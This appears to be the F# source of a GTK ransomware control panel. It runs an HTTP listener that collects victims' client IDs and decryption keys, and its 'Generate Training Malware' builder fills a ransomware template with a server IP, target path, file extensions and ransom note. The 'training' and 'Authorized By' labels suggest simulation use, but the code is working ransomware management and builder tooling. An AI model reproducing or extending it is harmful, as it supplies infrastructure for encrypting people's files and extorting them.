﻿open System
open System.IO
open System.Net
open Gtk

// Define a mutable variable to track if the server is running
let mutable serverRunning = false
let mutable listener : HttpListener option = None

// Define a mutable list to store authorized by, client IDs, and keys
let mutable clientKeys = []

// Function to update the client list in the GUI
let updateClientList (listStore: ListStore) =
    printfn "Updating client list in the GUI..."
    listStore.Clear() // Clear existing entries
    for (authorizedBy, clientId, key) in clientKeys do
        printfn "Adding to list view: AuthorizedBy = %s, ClientID = %s, Key = %s" authorizedBy clientId key
        // Append authorized by, client ID, and key to the list store
        listStore.AppendValues([| authorizedBy :> obj; clientId :> obj; key :> obj |]) |> ignore
    printfn "Client list update complete."

// Function to start the HTTP listener
let startHttpListener (port: int) (listStore: ListStore) =
    if serverRunning then
        printfn "Server is already running"
    else
        try
            let newListener = new HttpListener()
            newListener.Prefixes.Add(sprintf "http://+:%d/" port)
            newListener.Start()
            listener <- Some(newListener)
            serverRunning <- true
            printfn "HTTP listener started on port %d" port

            let rec listenLoop () =
                async {
                    let! context = newListener.GetContextAsync() |> Async.AwaitTask
                    let request = context.Request
                    use reader = new StreamReader(request.InputStream)
                    let data = reader.ReadToEnd()
                    printfn "Received data: %s" data

                    // Parse the authorized by, client ID, and decryption key from the request (e.g., AuthorizedBy=John,ID=123,Key=ABC)
                    let parts = data.Split(',')
                    if parts.Length = 3 then
                        let authorizedBy = parts.[0].Split('=')[1]
                        let clientId = parts.[1].Split('=')[1]
                        let key = parts.[2].Split('=')[1]

                        // Add authorized by, client ID, and key to the mutable list
                        clientKeys <- (authorizedBy, clientId, key) :: clientKeys

                        // Print to terminal
                        printfn "Received: Authorized by = %s, Client ID = %s, Key = %s" authorizedBy clientId key

                        // Ensure that the update happens on the main GTK thread
                        GLib.Idle.Add(fun () -> 
                            updateClientList(listStore) |> ignore
                            false
                        ) |> ignore

                    // Respond to the client
                    let response = context.Response
                    let buffer = System.Text.Encoding.UTF8.GetBytes("Received")
                    response.OutputStream.Write(buffer, 0, buffer.Length)
                    response.Close()

                    return! listenLoop ()
                }
            listenLoop () |> Async.Start
        with
        | ex -> printfn "Error starting server: %s" ex.Message

// Function to stop the HTTP listener
let stopHttpListener () =
    match listener with
    | Some l ->
        l.Stop()
        listener <- None
        serverRunning <- false
        printfn "HTTP listener stopped"
    | None ->
        printfn "No listener to stop"

// Function to modify the ransomware script
let modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension authorizedBy =
    let scriptContent = File.ReadAllText(templatePath)
    let modifiedScript =
        scriptContent
            .Replace("[SERVER_IP]", serverIp)
            .Replace("[NOTE_FILE]", noteFile)
            .Replace("[MESSAGE]", message)
            .Replace("[PATH_TO_ENCRYPT]", pathToEncrypt)
            .Replace("[EXCLUDE_EXTENSIONS]", excludeExtensions)
            .Replace("[CUSTOM_EXTENSION]", customExtension)
            .Replace("[AUTHORIZED_BY]", authorizedBy)  // Add authorized by to the note
    File.WriteAllText(outputPath, modifiedScript)
    printfn "Modified ransomware script saved to %s" outputPath

// Create the GTK# GUI
[<EntryPoint>]
let main argv =
    Application.Init()

    // Create the main window
    let window = new Window("Management GUI")
    window.SetDefaultSize(600, 400)
    window.DeleteEvent.Add(fun _ -> Application.Quit())

    // Create a vertical box to contain all widgets
    let vbox = new VBox()

    // Create a list store to hold authorized by, client ID, and key pairs
    let listStore = new ListStore(typeof<string>, typeof<string>, typeof<string>)

    // Create a tree view to display authorized by, client IDs, and keys
    let treeView = new TreeView(listStore)

    // Add column headers for the TreeView (Authorized By, Client ID, Key)
    let authorizedByColumn = new TreeViewColumn("Authorized By", new CellRendererText(), "text", 0)
    let clientIdColumn = new TreeViewColumn("Client ID", new CellRendererText(), "text", 1)
    let keyColumn = new TreeViewColumn("Decryption Key", new CellRendererText(), "text", 2)

    // Add the columns to the TreeView
    treeView.AppendColumn(authorizedByColumn)
    treeView.AppendColumn(clientIdColumn)
    treeView.AppendColumn(keyColumn)

    // Add the TreeView to the window
    vbox.PackStart(treeView, true, true, 0u)

    // Create a button to start/stop the server
    let serverButton = new Button("Start Server")
    serverButton.ModifyBg(StateType.Normal, new Gdk.Color(0uy, 255uy, 0uy)) // Green background for Start
    serverButton.Clicked.Add(fun _ ->
        if not serverRunning then
            // Start the server
            startHttpListener 8080 listStore
            serverButton.Label <- "Stop Server"
            serverButton.ModifyBg(StateType.Normal, new Gdk.Color(255uy, 0uy, 0uy)) // Red background for Stop
            serverRunning <- true
        else
            // Stop the server
            stopHttpListener()
            serverButton.Label <- "Start Server"
            serverButton.ModifyBg(StateType.Normal, new Gdk.Color(0uy, 255uy, 0uy)) // Green background for Start
            serverRunning <- false
    )
    vbox.PackStart(serverButton, false, false, 10u)

    // Create a "Delete Selected" button
    let deleteButton = new Button("Delete Selected")
    deleteButton.Clicked.Add(fun _ ->
        let selection = treeView.Selection
        let success, iter = selection.GetSelected()
        if success then
            let clientId = listStore.GetValue(iter, 1) :?> string // Cast to string (column 1 = Client ID)
            printfn "Deleting: Client ID = %s" clientId

            // Remove the selected client ID and key from the list
            clientKeys <- clientKeys |> List.filter (fun (_, id, _) -> id <> clientId)
            updateClientList(listStore) // Refresh the list after deletion
        else
            printfn "No row selected"
    )
    vbox.PackStart(deleteButton, false, false, 10u)

    // Create the "Generate Training Malware" button
    let generateButton = new Button("Generate Training Malware")
    generateButton.Clicked.Add(fun _ ->
        // Create a dialog to collect malware options
        let dialog = new Dialog("Generate Training Malware", window, DialogFlags.Modal)
        dialog.SetDefaultSize(400, 300)

        // Add input fields to the dialog
        let serverIpEntry = new Entry() // Server IP
        let noteFileEntry = new Entry() // Note file name
        let messageEntry = new Entry() // Message
        let pathToEncryptEntry = new Entry() // Path to encrypt
        let excludeExtensionsEntry = new Entry() // Exclude extensions
        let customExtensionEntry = new Entry() // Custom extension
        let authorizedByEntry = new Entry() // Authorized By

        // Add a confirmation button to the dialog
        dialog.AddButton("Generate", ResponseType.Accept) |> ignore

        // Display the dialog
        dialog.ContentArea.PackStart(new Label("Server IP:"), false, false, 0u)
        dialog.ContentArea.PackStart(serverIpEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Note File Name:"), false, false, 0u)
        dialog.ContentArea.PackStart(noteFileEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Message:"), false, false, 0u)
        dialog.ContentArea.PackStart(messageEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Path to Encrypt:"), false, false, 0u)
        dialog.ContentArea.PackStart(pathToEncryptEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Exclude Sensitive Files (extensions):"), false, false, 0u)
        dialog.ContentArea.PackStart(excludeExtensionsEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Custom Extension:"), false, false, 0u)
        dialog.ContentArea.PackStart(customExtensionEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Authorized By:"), false, false, 0u)
        dialog.ContentArea.PackStart(authorizedByEntry, false, false, 0u)
        dialog.ShowAll()

        let response = dialog.Run()
        if response = int ResponseType.Accept then
            let serverIp = serverIpEntry.Text
            let noteFile = noteFileEntry.Text
            let message = messageEntry.Text
            let pathToEncrypt = pathToEncryptEntry.Text
            let excludeExtensions = excludeExtensionsEntry.Text
            let customExtension = customExtensionEntry.Text
            let authorizedBy = authorizedByEntry.Text

            let templatePath = "./Templates/template_ransomware.fsx"
            let outputPath = "./Generated/malware_simulation.fsx"

            modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension authorizedBy
        dialog.Destroy()
    )
    vbox.PackStart(generateButton, false, false, 10u)

    // Add the vertical box to the window
    window.Add(vbox)

    // Show all components
    window.ShowAll()
    Application.Run()

    0
